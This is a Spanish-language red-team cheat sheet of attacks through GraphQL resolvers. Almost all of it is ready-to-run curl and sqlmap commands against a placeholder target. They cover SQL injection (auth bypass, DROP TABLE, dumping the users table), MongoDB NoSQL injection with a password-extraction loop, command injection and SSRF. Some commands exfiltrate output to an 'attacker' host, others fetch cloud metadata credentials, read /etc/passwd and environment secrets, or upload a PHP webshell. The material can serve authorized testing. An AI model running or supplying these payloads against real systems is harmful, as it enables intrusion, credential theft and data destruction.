---
aliases:
  - GraphQL SQLi
  - GraphQL NoSQLi
  - GraphQL SSRF
  - GraphQL Command Injection
tags:
  - vuln/graphql
  - vuln/sqli
  - vuln/nosqli
  - vuln/ssrf
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[GraphQL Injection]]"
  - "[[SQL Injection (SQLi)]]"
  - "[[NoSQL Injection]]"
  - "[[Server-Side Request Forgery (SSRF)]]"
---
# GraphQL - Inyecciones via Resolvers

---

## SQLi en Args de Query / Mutation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(username:\"admin'\'' OR 1=1 -- -\"){id email}}"}' https://target/graphql` | Auth bypass — devuelve primer user | Login resolver con string arg. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{order(id:\"1 UNION SELECT 1,2,3 -- -\"){id}}"}' https://target/graphql` | UNION extraction | Si `id` declarado como String. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query($u:String){user(username:$u){id}}", "variables":{"u":"admin'\'' OR 1=1 -- -"}}' https://target/graphql` | Auth bypass via variables | Cuando server escapa inline pero no variables. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{users(where:\"role='\''admin'\'' OR 1=1\"){id}}"}' https://target/graphql` | Bypass filter | App expone filter raw como string. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{posts(orderBy:\"id);DROP TABLE users--\"){id}}"}' https://target/graphql` | Order by SQLi | OrderBy interpolado en query. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{users(limit:\"10 UNION SELECT user,pass FROM users--\"){id}}"}' https://target/graphql` | LIMIT SQLi | Limit declarado como String. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{createUser(name:\"x'\'',(SELECT pass FROM users))-- -\"){id}}"}' https://target/graphql` | INSERT SQLi extraction | Mutation con concat. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query($f:JSON){items(filter:$f){id}}", "variables":{"f":{"role":"admin'\'' OR '\''1'\''='\''1"}}}' https://target/graphql` | Bypass via JSON scalar | Resolver acepta JSON pasa al ORM. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(username:\"x'\'' OR SLEEP(5)-- -\"){id}}"}' https://target/graphql` | Confirma SQLi blind por timing (respuesta tarda 5s) | No hay error visible. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(username:\"x'\'' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='\''a\"){id}}"}' https://target/graphql` | Char-by-char extraction blind (boolean oracle) | Sin output directo. |
| `sqlmap -r graphql.req --batch --risk 3 --level 5` | Auto-explotar SQLi | Request guardado de Burp con `*` en arg. |
| `sqlmap -r graphql.req --tamper=between,space2comment` | Bypass WAF básico | Filter strip espacios. |
| `sqlmap -r graphql.req --prefix='\"' --suffix='\"' --technique=BEUST` | Forzar quote handling | sqlmap confunde JSON quoting. |
^graphql-inj-sqli

### Workflow sqlmap GraphQL

```bash
# Capturar en Burp con arg controlable
# Save as graphql.req
# Marcar field con * — sqlmap injecta ahí

# Ejemplo req.txt:
# POST /graphql HTTP/1.1
# Host: target
# Content-Type: application/json
# Cookie: session=...
#
# {"query":"query{user(username:\"*\"){id email}}"}

sqlmap -r graphql.req --batch --risk 3 --level 5 --random-agent
sqlmap -r graphql.req --batch --dbs                    # Lista DBs
sqlmap -r graphql.req --batch -D appdb --tables        # Lista tables
sqlmap -r graphql.req --batch -D appdb -T users --dump # Dump users
```

---

## NoSQLi en Resolvers MongoDB

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(filter:{username:{\"$ne\":null},password:{\"$ne\":null}}){id}}"}' https://target/graphql` | Auth bypass — primer user con username y password | Mongoose sin sanitización. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(filter:{password:{\"$regex\":\"^a.*\"}}){id}}"}' https://target/graphql` | Confirma char inicial password | Char-by-char extraction. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(filter:{$where:\"this.password.length > 10\"}){id}}"}' https://target/graphql` | Length oracle via $where | $where habilitado en MongoDB. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(filter:{$where:\"sleep(5000)\"}){id}}"}' https://target/graphql` | Timing oracle via $where | Confirma JS eval. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query($f:JSON){user(filter:$f){id}}","variables":{"f":{"username":{"$ne":null}}}}' https://target/graphql` | Bypass via JSON scalar (variables) | Variables JSON passthrough. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(filter:{username:{\"$in\":[\"admin\",\"root\",\"superuser\"]}}){id}}"}' https://target/graphql` | Match cualquiera de la lista | Bulk username probe. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(filter:{username:{\"$not\":{\"$eq\":\"normaluser\"}}}){id}}"}' https://target/graphql` | Match todo excepto un value | Logic inversion. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user(filter:{username:{\"$gt\":\"\"}}){id}}"}' https://target/graphql` | Match cualquier string | Cuando $ne no funciona. |
| `nosqlmap` con request saved | Auto-explotar NoSQLi | Si pattern es estándar. |
^graphql-inj-nosqli

### Char-by-char password extraction (bash loop)

```bash
PASS=""
for i in {1..32}; do
  for c in {a..z} {0..9}; do
    R=$(curl -s -X POST https://target/graphql \
      -H "Content-Type: application/json" \
      -d "{\"query\":\"query{user(username:\\\"admin\\\",filter:{password:{\\\"\$regex\\\":\\\"^${PASS}${c}\\\"}}){id}}\"}")
    if echo "$R" | grep -q '"id"'; then
      PASS="${PASS}${c}"
      echo "[$i] $PASS"
      break
    fi
  done
done
```

---

## Command Injection / SSRF / Path Traversal

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{ping(host:\"; id; #\"){result}}"}' https://target/graphql` | RCE via shell metachar | Resolver invoca shell. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{ping(host:\"`id`\"){result}}"}' https://target/graphql` | RCE via backticks | Shell expansion. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{ping(host:\"127.0.0.1$(id)\"){result}}"}' https://target/graphql` | RCE via $() | Bash subshell. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{ping(host:\"127.0.0.1\|id\"){result}}"}' https://target/graphql` | RCE via pipe | Pipe interpretado. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{ping(host:\";curl http://attacker/$(id\|base64 -w0)\"){result}}"}' https://target/graphql` | OOB exfil de output | Blind RCE. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{fetch(url:\"http://127.0.0.1:6379/info\"){data}}"}' https://target/graphql` | SSRF a Redis local | Mutation con URL field. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{fetch(url:\"http://127.0.0.1:8500/v1/kv/?recurse\"){data}}"}' https://target/graphql` | SSRF a Consul | Service discovery local. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{fetch(url:\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"){data}}"}' https://target/graphql` | AWS metadata creds | EC2/EKS host. |
| `curl -sX POST -H 'Content-Type: application/json' -H 'Metadata: true' -d '{"query":"query{fetch(url:\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"){data}}"}' https://target/graphql` | Azure metadata | Azure VM. |
| `curl -sX POST -H 'Content-Type: application/json' -H 'Metadata-Flavor: Google' -d '{"query":"query{fetch(url:\"http://metadata.google.internal/computeMetadata/v1/\"){data}}"}' https://target/graphql` | GCP metadata | GCP VM. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{fetch(url:\"file:///etc/passwd\"){data}}"}' https://target/graphql` | LFI via file:// | URL parser permite file://. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{fetch(url:\"gopher://127.0.0.1:6379/_INFO\"){data}}"}' https://target/graphql` | Raw protocol smuggling | Server libcurl con gopher. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{fetch(url:\"http://attacker.oast.fun/$(hostname)\"){data}}"}' https://target/graphql` | DNS exfil blind SSRF | Sin output visible. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{uploadAvatar(url:\"http://attacker.oast.fun/track\"){id}}"}' https://target/graphql` | Server hace request a tu canary | Confirma SSRF blind. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{readFile(path:\"../../../../etc/passwd\"){content}}"}' https://target/graphql` | LFI via path traversal | Resolver expone file read. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{readFile(path:\"php://filter/convert.base64-encode/resource=index.php\"){content}}"}' https://target/graphql` | Source code disclosure | PHP backend. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{readFile(path:\"/proc/self/environ\"){content}}"}' https://target/graphql` | Env vars + secrets | Linux backend. |
^graphql-inj-cmdi-ssrf

Webshell vía mutation con scalar `Upload!` (multipart, no usa el base JSON): ver **Multipart file upload (GraphQL spec)** abajo.

### Multipart file upload (GraphQL spec)

```bash
# GraphQL multipart spec — webshell upload via mutations
curl -X POST https://target/graphql \
  -F operations='{"query":"mutation($file:Upload!){upload(file:$file){id}}","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@evil.php

# Polyglot PNG/PHP
curl -X POST https://target/graphql \
  -F operations='{"query":"mutation($f:Upload!){upload(file:$f){url}}","variables":{"f":null}}' \
  -F map='{"0":["variables.f"]}' \
  -F 0=@shell.png   # PNG header + <?php system($_GET['c']); ?>
```

### Blind SSRF probe con interactsh

```bash
# Generar canary
interactsh-client

# Lanzar con canary URL
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{fetch(url:\"http://abc123.oast.fun/?$(hostname)\"){data}}"}'

# DNS hits → SSRF confirmed + hostname exfil en subdomain
```

---
